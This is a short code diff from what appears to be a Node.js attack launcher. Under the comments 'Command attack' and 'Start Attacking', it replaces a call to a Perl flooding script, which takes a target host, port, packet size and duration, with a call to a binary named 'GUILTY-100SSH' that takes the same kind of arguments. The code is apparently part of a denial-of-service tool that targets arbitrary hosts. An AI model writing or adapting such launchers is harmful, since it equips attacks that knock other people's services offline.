@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
+exec(`./GUILTY-100SSH ${host} ${port} 50000 ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
